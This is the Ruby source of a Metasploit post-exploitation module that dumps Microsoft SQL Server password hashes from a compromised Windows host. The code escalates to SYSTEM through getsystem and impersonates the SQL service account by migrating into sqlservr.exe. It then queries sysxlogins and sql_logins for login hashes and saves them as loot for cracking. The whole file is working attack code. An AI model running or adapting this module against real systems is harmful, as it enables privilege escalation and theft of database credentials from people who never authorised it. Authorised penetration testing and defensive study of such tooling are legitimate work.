##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'
require 'rex/proto/rfb'


class Metasploit3 < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  VERSION_5 = Gem::Version.new('5.0')
  VERSION_6 = Gem::Version.new('6.0')
  VERSION_8 = Gem::Version.new('8.0')
  VERSION_9 = Gem::Version.new('9.0')

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Local SQL Server Password Hashes Dump',
        'Description'   => %q{ This module extracts the usernames and password
        hashes from a MSSQL server and stores them in the loot using the
        same technique in mssql_local_auth_bypass (Credits: Scott Sutherland)
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Mike Manzotti <mike.manzotti[at]dionach.com>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))

    register_options(
      [
        OptString.new('INSTANCE',  [false, 'Name of target SQL Server instance', '']),
      ], self.class)
  end

  def run

    # Set verbosity level
    verbose = datastore['VERBOSE'].to_s.downcase

    # Set instance name (if specified)
    instance = datastore['INSTANCE'].to_s.upcase

    # Display target
    print_status("Running module against #{sysinfo['Computer']}")

    # Get LocalSystem privileges
    system_status = givemesystem
    if system_status[0]

      # Check if a SQL Server service is running
      service_instance = check_for_sqlserver(instance)
      if service_instance != 0

        # Identify available native SQL client
        sql_client = get_sql_client()
        if sql_client != 0

          # Get Password Hashes
          add_sql_status = get_sql_hash(sql_client,instance,service_instance,verbose)

          # If Fail
          if add_sql_status == 0

            # Attempt to impersonate sql server service account (for sql server 2012)
            impersonate_status = impersonate_sql_user(service_instance,verbose)
            if impersonate_status == 1

              # Get Password Hashes
              get_sql_hash(sql_client,instance,service_instance,verbose)

            end
          end
        end
      end
    else
      print_error("Could not obtain LocalSystem privileges")
    end

    # return to original priv context
    session.sys.config.revert_to_self
  end


  ## ----------------------------------------------
  ## Method to check if the SQL Server service is running
  ## ----------------------------------------------
  def check_for_sqlserver(instance)

    print_status("Checking for SQL Server...")

    # Get Data
    running_services = run_cmd("net start")

    # Parse Data
    services_array = running_services.split("\n")

    # Check for the SQL Server service
    services_array.each do |service|
      if instance == "" then
        # Target default instance
        if service =~ /SQL Server \(| MSSQLSERVER/ then

          # Display results
          service_instance = service.gsub(/SQL Server \(/, "").gsub(/\)/, "").lstrip.rstrip
          print_status("SQL Server instance found: #{service_instance}")
          return service_instance
        end
      else

        # Target user defined instance
        if service =~ /#{instance}/ then

          # Display user defined instance
          print_status("SQL Server instance found: #{instance}")
          return instance
        end
      end
    end

    # Fail
    if instance == "" then
      print_error("SQL Server instance NOT found")
    else
      print_error("SQL Server instance \"#{instance}\" was NOT found")
    end
    return 0
  end


  ## ----------------------------------------------
  ## Method for identifying which SQL client to use
  ## ----------------------------------------------
  def get_sql_client

    print_status("Checking for native client...")

    # Get Data - osql
    running_services1 = run_cmd("osql -?")

    # Parse Data - osql
    services_array1 = running_services1.split("\n")

    # Check for osql
    if services_array1.join =~ /(SQL Server Command Line Tool)|(usage: osql)/
      print_status("OSQL client was found")
      return "osql"
    end

    # Get Data - sqlcmd
    running_services = run_cmd("sqlcmd -?")

    # Parse Data - sqlcmd
    services_array = running_services.split("\n")

    # Check for SQLCMD
    services_array.each do |service|
      if service =~ /SQL Server Command Line Tool/ then
        print_status("SQLCMD client was found")
        return "sqlcmd"
      end
    end

    # Fail
    print_error("No native SQL client was found")
    return 0
  end

  ## ----------------------------------------------
  ## Method for getting SQL Version
  ## ----------------------------------------------
  def get_sql_version(sqlclient,instance,service_instance,verbose)

    print_status("Attempting to get version...")

    mssql_version_query = "SELECT @@version"

    # Setup command format to accomidate version inconsistencies
    if instance == ""
      # Check default instance name
      if service_instance == "MSSQLSERVER" then
        print_status(" o MSSQL Service instance: #{service_instance}") if verbose == "true"
        sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"SET nocount on;#{mssql_version_query}\" -h-1"
      else
        # User defined instance
      print_status(" o  OTHER Service instance: #{service_instance}") if verbose == "true"
      sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{service_instance} -Q \"SET nocount on;#{mssql_version_query}\" -h-1"
      end
    else
      # User defined instance
      print_status(" o defined instance: #{service_instance}") if verbose == "true"
      sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{instance} -Q \"SET nocount on;#{mssql_version_query}\" -h-1"
    end

    # Display debugging information
    print_status("Running command:") if verbose == "true"
    print_status("#{sqlcommand}") if verbose == "true"

    # Get Data
    get_version_result = run_cmd("#{sqlcommand}")

    # Parse Data
    get_version_array = get_version_result.split("\n")
    version_year = get_version_array[0].strip.slice(/\d\d\d\d/)
    if version_year
      print_status("MSSQL version found: #{version_year}")
      return version_year
    else
      print_error("MSSQL version not found")
    end
  end

  ## ----------------------------------------------
  ## Method for getting password hashes
  ## ----------------------------------------------
  def get_sql_hash(sqlclient,instance,service_instance,verbose)

    version_year = get_sql_version(sqlclient,instance,service_instance,verbose)

    case version_year
    when "2000"
      hashtype = "mssql"
      mssql_password_hashes_query = "SELECT name+':'+master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins"
    when "2005", "2008"
      hashtype = "mssql05"
      mssql_password_hashes_query = "SELECT name+':'+master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins"
    when "2012", "2014"
      hashtype = "mssql12"
      mssql_password_hashes_query = "SELECT name+':'+master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins"
    end

    print_status("Attempting to get password hashes...")

    # Setup command format to accomidate version inconsistencies
    if instance == ""
      # Check default instance name
      if service_instance == "MSSQLSERVER" then
        print_status(" o MSSQL Service instance: #{service_instance}") if verbose == "true"
        sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"SET nocount on;#{mssql_password_hashes_query}\" -h-1 -w 200"
      else
      # User defined instance
      print_status(" o  OTHER Service instance: #{service_instance}") if verbose == "true"
      sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{service_instance} -Q \"SET nocount on;#{mssql_password_hashes_query}\" -h-1 -w 200"
      end
    else
      # User defined instance
      print_status(" o defined instance: #{instance}") if verbose == "true"
      sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{service_instance} -Q \"SET nocount on;#{mssql_password_hashes_query}\" -h-1 -w 200"
    end

    # Display debugging information
    print_status("Running command:") if verbose == "true"
    print_status("#{sqlcommand}") if verbose == "true"

    # Get Data
    get_hash_result = run_cmd("#{sqlcommand}")
    #print_good("Raw Result: \n#{get_hash_result}")

    
    # Parse Data
    get_hash_array = get_hash_result.split("\n").grep(/:/)

    # Save data
    loot_hashes = ""
    get_hash_array.each do |row|
      user = row.strip.split(":")[0]
      hash = row.strip.split(":")[1]

      service_data = {
      address: ::Rex::Socket.getaddress(rhost,true),
      port: rport,
      service_name: 'mssql',
      protocol: 'tcp',
      workspace_id: myworkspace_id
      }

      # Initialize Metasploit::Credential::Core object
      credential_data = {
        post_reference_name: refname,
        origin_type: :session,
        private_type: :nonreplayable_hash,
        private_data: hash,
        username: user,
        session_id: session_db_id,
        jtr_format: hashtype,
        workspace_id: myworkspace_id
      }

      credential_data.merge!(service_data)

      # Create the Metasploit::Credential::Core object
      credential_core = create_credential(credential_data)

      # Assemble the options hash for creating the Metasploit::Credential::Login object
      login_data = {
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      # Merge in the service data and create our Login
      login_data.merge!(service_data)
      login = create_credential_login(login_data)

      print_good("#{rhost} Saving = #{user}:#{hash}")

      loot_hashes << user+":"+hash+"\n"
 
    end
    if loot_hashes != "" 
        # Store MSSQL password hash as loot
        loot_path = store_loot('mssql.hash', 'text/plain', session, loot_hashes, 'mssql_hashdump.txt', 'MSSQL Password Hash')
        print_good("MSSQL password hash saved in: #{loot_path}")
        return 1
    else
        return 0
    end
  end

  ## ----------------------------------------------
  ## Method for executing cmd and returning the response
  ## Note: This is from one of Jabra's modules - Thanks man!
  ##----------------------------------------------
  def run_cmd(cmd,token=true)
    opts = {'Hidden' => true, 'Channelized' => true, 'UseThreadToken' => token}
    process = session.sys.process.execute(cmd, nil, opts)
    res = ""
    while (d = process.channel.read)
      break if d == ""
      res << d
    end
    process.channel.close
    process.close
    return res
  end


  ## ----------------------------------------------
  ## Method for impersonating sql server instance
  ## Taken from mssql_local_auth_bypass
  ## Thanks Scott Sutherland !
  ## ----------------------------------------------
  def impersonate_sql_user(service_instance,verbose)

    # Print the current user
    blah = session.sys.config.getuid if verbose == "true"
    print_status("Current user: #{blah}") if verbose == "true"

    # Define target user/pid
    targetuser = ""
    targetpid = ""

    # Identify SQL Server service processes
    print_status("Searching for sqlservr.exe processes not running as SYSTEM...")
    session.sys.process.get_processes().each do |x|

      # Search for all sqlservr.exe processes
      if ( x['name'] == "sqlservr.exe" and x['user'] != "NT AUTHORITY\\SYSTEM")

        # Found one
        print_good("Found \"#{x['user']}\" running sqlservr.exe process #{x['pid']}")

        # Define target pid / user
        if x['user'] =~ /NT SERVICE/ then
          if x['user'] == "NT SERVICE\\MSSQL$#{service_instance}" then
            targetuser = "NT SERVICE\\MSSQL$#{service_instance}"
            targetpid = x['pid']
          end
        else
          targetuser = x['user']
          targetpid = x['pid']
        end
      end
    end

    # Attempt to migrate to target sqlservr.exe process
    if targetuser == "" then
      print_error("Unable to find sqlservr.exe process not running as SYSTEM")
      return 0
    else
      begin
        # Migrating works, but I can't rev2self after its complete
        print_status("Attempting to migrate to process #{targetpid}...")
        session.core.migrate(targetpid.to_i)

        # Statusing
        blah = session.sys.config.getuid if verbose == "true"
        print_status("Current user: #{blah}") if verbose == "true"
        print_good("Successfully migrated to sqlservr.exe process #{targetpid}")
        return 1
      rescue
        print_error("Unable to migrate to sqlservr.exe process #{targetpid}")
        return 0
      end
    end
  end


  ## ----------------------------------------------
  ## Method to become SYSTEM if required
  ## Note: This is from one of Jabra's modules.
  ## ----------------------------------------------
  def givemesystem

    # Statusing
    print_status("Checking if user is SYSTEM...")

    # Check if user is system
    if session.sys.config.getuid == "NT AUTHORITY\\SYSTEM"
      print_status("User is SYSTEM")
      return 1
    else
      # Attempt to get LocalSystem privileges
      print_error("User is NOT SYSTEM")
      print_status("Attempting to get SYSTEM privileges...")
      system_status = session.priv.getsystem
      if system_status[0]
        print_good("Success!, user is now SYSTEM")
        return 1
      else
        print_error("Unable to obtained SYSTEM privileges")
        return 0
      end
    end
  end

end
